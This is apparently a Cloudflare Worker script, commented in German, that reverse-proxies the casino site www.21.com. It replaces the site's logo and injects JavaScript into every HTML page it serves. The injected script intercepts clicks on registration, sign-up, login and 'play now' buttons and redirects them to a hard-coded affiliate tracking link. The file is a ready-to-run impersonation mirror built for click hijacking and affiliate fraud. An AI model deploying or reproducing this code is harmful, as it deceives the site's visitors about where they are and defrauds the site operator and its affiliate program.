export default {
  async fetch(request) {
    const targetBase = "https://www.21.com";
    
    // Dein genauer Affiliate-Tracking-Link
    const affiliateUrl = "https://prod.trk21.com/click?offer=FF5GG2YAJ0P0&uid=CVuo3XCJ";
    
    // Trage hier die Bild-URL deines neuen Logos ein:
    const newLogoUrl = "https://images.law.com/brightspot/07/9a/9f50cbdc4a4eaa523a73b70a4814/flank-logo-1-767x633.jpg";

    const url = new URL(request.url);
    const fetchUrl = new URL(url.pathname + url.search, targetBase);

    const response = await fetch(fetchUrl, {
      method: request.method,
      headers: {
        "User-Agent": request.headers.get("User-Agent") || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Host": "www.21.com",
        "Referer": "https://www.21.com/"
      }
    });

    const contentType = response.headers.get("content-type") || "";

    if (contentType.includes("text/html")) {
      return new HTMLRewriter()
        .on("head", {
          element(el) {
            el.append(`
              <style>
                /* Zwingt den Browser dauerhaft, dein Logo zu zeigen (übersteuert React/Hydration) */
                img[src*="logo"], img[alt*="21.com"], img[aria-label*="21.com"] {
                  content: url("${newLogoUrl}") !important;
                }
              </style>
              <script>
                document.addEventListener("DOMContentLoaded", function() {
                  const affLink = "${affiliateUrl}";

                  // Fängt alle Klicks auf Registrierungs- & CTA-Buttons ab
                  document.addEventListener("click", function(e) {
                    const target = e.target.closest("a, button");
                    if (!target) return;

                    const href = (target.getAttribute("href") || "").toLowerCase();
                    const text = (target.innerText || "").toLowerCase();

                    // Wenn auf Anmelden, Registrieren oder Spielen geklickt wird
                    if (
                      href.includes("register") ||
                      href.includes("signup") ||
                      href.includes("join") ||
                      text.includes("registrier") ||
                      text.includes("anmelden") ||
                      text.includes("jetzt spielen") ||
                      text.includes("konto")
                    ) {
                      e.preventDefault();
                      e.stopPropagation();
                      window.location.href = affLink;
                    }
                  }, true);
                });
              </script>
            `, { html: true });
          }
        })
        .transform(response);
    }

    return response;
  }
};
